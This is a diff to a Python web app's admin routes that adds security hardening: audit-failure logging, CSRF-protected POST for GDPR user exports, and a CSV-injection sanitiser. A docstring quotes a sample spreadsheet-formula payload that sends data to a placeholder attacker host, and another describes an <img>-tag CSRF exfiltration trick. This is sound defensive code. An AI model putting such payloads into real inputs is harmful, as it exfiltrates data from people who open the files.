@@ -77,6 +77,16 @@ def _current_user(request):
 
 def _audit(action, *, admin, request, target_type=None, target_id=None,
            target_description=None, before=None, after=None, notes=None):
+    # NOTE: security.audit.log_action() already wraps DB-layer failures in
+    # its own try/except so audit logging never blocks the admin action.
+    # The only exceptions that surface up to *this* helper come from
+    # programming errors at the call site — AttributeError on a missing
+    # AuditAction constant, TypeError on a bad kwarg, etc. A bare
+    # `except: pass` here silently hid the missing FEATURE_FLAG_* /
+    # IMPERSONATION_* constants and produced ZERO audit rows for those
+    # actions. We now log.exception() so the next missing constant is
+    # loud in the gateway log. We still don't re-raise — admin actions
+    # must not break on an audit bug — but the failure is visible.
     try:
         from security import audit as _a
         _a.log_action(
@@ -90,7 +100,11 @@ def _audit(action, *, admin, request, target_type=None, target_id=None,
             request=request, notes=notes,
         )
     except Exception:
-        pass
+        log.exception(
+            "admin_routes._audit failed (action=%r) — likely a missing "
+            "AuditAction constant or a bad kwarg; investigate immediately",
+            action,
+        )
 
 
 def _fmt_ts(ts, fmt="%Y-%m-%d %H:%M:%S UTC"):
@@ -2169,9 +2183,13 @@ def _users_render_row(
             f'{csrf_field}'
             f'<button class="btn btn--danger" type="submit">Revoke sessions</button></form>'
         )
-        # Export data (GDPR) — links to the existing per-user export trigger.
+        # Export data (GDPR) — POST so we get CSRF coverage + the action
+        # never fires from a passive <img>/<a> in another tab.
         actions.append(
-            f'<a class="btn" href="/admin/users/{uid}/export">Export data</a>'
+            f'<form method="post" action="/admin/users/{uid}/export" '
+            f'style="display:inline">'
+            f'{csrf_field}'
+            f'<button class="btn" type="submit">Export data</button></form>'
         )
     else:
         actions.append('<span style="color:var(--text-tertiary);font-size:12px">Insufficient</span>')
@@ -2347,17 +2365,54 @@ async def users_revoke_sessions(request: Request, user_id: int):
     return RedirectResponse("/admin/users", status_code=302)
 
 
+def _csv_safe_cell(value) -> str:
+    """Defang CSV-injection payloads.
+
+    Spreadsheet apps (Excel, Numbers, Google Sheets) evaluate any cell
+    whose first character is ``=``, ``+``, ``-``, ``@``, tab, or carriage
+    return as a formula. A username like ``=HYPERLINK("http://atk/?c="&A1,"x")``
+    will exfiltrate the admin's sheet on open. Prefix with a single quote
+    so the cell is rendered as literal text. NUL bytes are dropped because
+    Excel treats them as a row separator on some platforms.
+    """
+    if value is None:
+        return ""
+    s = str(value).replace("\x00", "")
+    if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
+        return "'" + s
+    return s
+
+
 async def users_export_data(request: Request, user_id: int):
-    """GET /admin/users/{user_id}/export — admin GDPR export shortcut.
+    """POST /admin/users/{user_id}/export — admin GDPR export shortcut.
 
     The full export pipeline lives in ``export_routes`` (rate-limited to
     1/day/user). Admins responding to a GDPR request for a *different*
     user can use this shortcut to hand the user a CSV of their account
     snapshot inline — same shape, smaller scope than the async export ZIP.
+
+    POST (not GET) because this writes an audit row and returns PII. A GET
+    surface would let an attacker page silently exfiltrate via
+    ``<img src="/admin/users/N/export">`` in an authed admin's browser.
+    CSRF is enforced both by the global middleware and by the explicit
+    re-check below (defense in depth).
     """
     admin = _require_admin_user(request, page=True)
     if admin is None:
         return _denied_response(request)
+
+    # Explicit CSRF re-check on top of the middleware. The middleware
+    # already enforced this for POST, but a second check inside the
+    # handler keeps the property local to the function and survives
+    # accidental middleware-exemption changes.
+    srv = _srv()
+    form = await request.form()
+    submitted = form.get(srv.CSRF_FORM_FIELD) or request.headers.get(
+        getattr(srv, "CSRF_HEADER_NAME", "x-csrf-token")
+    )
+    if not srv._validate_csrf(request, submitted):
+        raise HTTPException(status_code=403, detail="CSRF validation failed")
+
     target = db.get_user_by_id(user_id)
     if not target:
         raise HTTPException(status_code=404, detail="User not found")
@@ -2373,14 +2428,14 @@ async def users_export_data(request: Request, user_id: int):
     )
     for k in safe_keys:
         try:
-            w.writerow([k, target[k]])
+            w.writerow([_csv_safe_cell(k), _csv_safe_cell(target[k])])
         except (IndexError, KeyError):
             continue
 
     try:
         from security import audit as _a
         _audit(
-            _a.AuditAction.USER_PROMOTE_ADMIN,  # closest neutral admin-read action
+            _a.AuditAction.USER_EXPORT_DATA,
             admin=admin, request=request,
             target_type="user", target_id=user_id,
             target_description=target["email"],
@@ -2961,7 +3016,7 @@ def register(app) -> None:
     )
     app.add_api_route(
         "/admin/users/{user_id}/export", users_export_data,
-        methods=["GET"], include_in_schema=False,
+        methods=["POST"], include_in_schema=False,
     )
     app.add_api_route(
         "/admin/users/bulk-actions", users_bulk_actions,
